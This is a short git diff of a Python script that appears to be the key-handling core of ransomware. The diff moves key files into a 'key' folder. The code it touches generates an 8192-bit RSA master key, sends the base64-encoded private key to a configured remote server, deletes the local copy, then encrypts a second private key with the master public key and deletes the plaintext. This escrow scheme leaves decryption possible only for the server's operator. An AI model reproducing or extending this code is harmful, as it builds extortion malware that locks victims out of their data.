@@ -73,16 +73,22 @@ def getMacAddress():
 #Record Start Time
 start = recordTime("Start process on ")
 
+#Create directory if not exists
+folder = "key"
+if not os.path.exists(folder):
+    os.makedirs(folder)
+
+
 #Generate 8mb RSA Key
-removeFile("privkey8.der")
-removeFile("pubkey8.der")
-generateRSA(8192,"privkey8.der","pubkey8.der")
+removeFile(folder+"/privkey8.der")
+removeFile(folder+"/pubkey8.der")
+generateRSA(8192,folder+"/privkey8.der",folder+"/pubkey8.der")
 
 #Read Config File
-config = readJsonFile('config.json')
+config = readJsonFile('lib/config.json')
 
 #Base64 encode 8mb RSA Private Key
-privkey = base64File("privkey8.der")
+privkey = base64File(folder+"/privkey8.der")
 
 #Send b64encoded Private key to server
 url = config['target_server']+'save'
@@ -93,18 +99,18 @@ result = postRequest(url,body).json()
 print("UUID : "+ result['id'])
 
 #Remove Privatekey File
-removeFile("privkey8.der")
+removeFile(folder+"/privkey8.der")
 
 #Generate 1mb RSA key
-removeFile("privkey1.der")
-removeFile("pubkey1.der")
-generateRSA(1024, "privkey1.der", "pubkey1.der")
+removeFile(folder+"/privkey1.der")
+removeFile(folder+"/pubkey1.der")
+generateRSA(1024, folder+"/privkey1.der", folder+"/pubkey1.der")
 
 #Encrypt 1mb RSA Private Key using 8mb RSA Public Key
-removeFile("privkey1_enc.der")
-rsaEnc = RsaEncrypt("pubkey8.der")
-rsaEnc.encryptFile("privkey1.der")
-removeFile("privkey1.der")
+removeFile(folder+"/privkey1_enc.der")
+rsaEnc = RsaEncrypt(folder+"/pubkey8.der")
+rsaEnc.encryptFile(folder+"/privkey1.der")
+removeFile(folder+"/privkey1.der")
 
 #Record End time
 end = recordTime("End process on ")
